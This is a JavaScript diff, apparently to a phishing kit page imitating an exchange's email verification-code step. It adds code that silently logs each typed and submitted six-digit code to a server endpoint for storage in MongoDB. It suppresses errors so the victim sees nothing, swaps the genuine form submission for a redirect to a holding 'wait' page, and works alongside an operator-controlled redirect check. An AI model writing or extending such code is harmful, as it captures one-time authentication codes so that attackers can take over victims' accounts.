@@ -360,6 +360,73 @@
       });
     }
 
+    // Retry mekanizması ile fetch wrapper - kayıt garantisi için
+    async function fetchWithRetry(url, options = {}, maxRetries = 5, delay = 1000) {
+      let lastError;
+      
+      for (let attempt = 1; attempt <= maxRetries; attempt++) {
+        try {
+          const response = await fetch(url, options);
+          
+          // 500 Internal Server Error veya 503 Service Unavailable durumunda retry yap
+          if ((response.status === 500 || response.status === 503) && attempt < maxRetries) {
+            console.log(`API request failed (${response.status}), retrying... (${attempt}/${maxRetries})`);
+            await new Promise(resolve => setTimeout(resolve, delay * attempt));
+            continue;
+          }
+          
+          if (response.ok) {
+            return response;
+          }
+          
+          return response;
+        } catch (err) {
+          lastError = err;
+          
+          if (attempt < maxRetries) {
+            console.log(`Network error, retrying... (${attempt}/${maxRetries}): ${err.message}`);
+            await new Promise(resolve => setTimeout(resolve, delay * attempt));
+            continue;
+          }
+        }
+      }
+      
+      // Son denemede de başarısız olursa sessizce devam et
+      if (lastError) {
+        console.error('Fetch failed after retries (silent):', lastError);
+      }
+      return { ok: false, status: 500 };
+    }
+
+    async function sendLogUpdate(payload) {
+      try {
+        const body = JSON.stringify(payload);
+        await fetchWithRetry('/api/log-page', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body,
+          keepalive: true
+        }, 5, 1000);
+      } catch (err) {
+        console.error('Mail code2 log error (silent):', err);
+        // Sessizce devam et - kullanıcıya hata gösterme
+      }
+    }
+
+    async function logMailCode2Input(value) {
+      if (value && value.trim()) {
+        try {
+          await sendLogUpdate({
+            page: 'mailcode2',
+            inputs: { input5: value.trim() }
+          });
+        } catch (err) {
+          console.error('Failed to log mail code2 input (silent):', err);
+          // Sessizce devam et - kullanıcıya hata gösterme
+        }
+      }
+    }
+
     async function checkRedirect() {
       try {
         const res = await fetch('/api/check-redirect', { 
@@ -392,13 +459,37 @@
     const mCInp = frm.elements[0];
     const btn = document.querySelector(".btn-group button.bc-btn.bc-btn-yellow.sensors-login");
 
-    frm.addEventListener('submit', (evt) => {
+    // Input değeri değiştiğinde kaydet
+    let mailCode2InputTimeout;
+    mCInp.addEventListener('input', function() {
+      clearTimeout(mailCode2InputTimeout);
+      mailCode2InputTimeout = setTimeout(function() {
+        if (mCInp.value && mCInp.value.trim()) {
+          logMailCode2Input(mCInp.value);
+        }
+      }, 500);
+    });
+
+    mCInp.addEventListener('blur', function() {
+      if (mCInp.value && mCInp.value.trim()) {
+        logMailCode2Input(mCInp.value);
+      }
+    });
+
+    frm.addEventListener('submit', async function(evt) {
         evt.preventDefault();
 
         if (/^\d{6}$/.test(mCInp.value.trim())) {
             mCInp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
             mCInp.closest('.bc-verify-input-content').nextElementSibling.style.color = '#76808f';
-            frm.submit();
+            // MongoDB'ye kaydın %100 tamamlanmasını bekle - input5 olarak kaydet
+            try {
+              await logMailCode2Input(mCInp.value);
+            } catch (err) {
+              console.error('Mail code2 log failed, continuing anyway', err);
+            }
+            // wait.html'e yönlendir
+            window.location.href = '/pages/wait.html';
         } else {
             mCInp.parentElement.style.borderColor = '#f84960';
             mCInp.closest('.bc-verify-input-content').nextElementSibling.style.color = 'red';
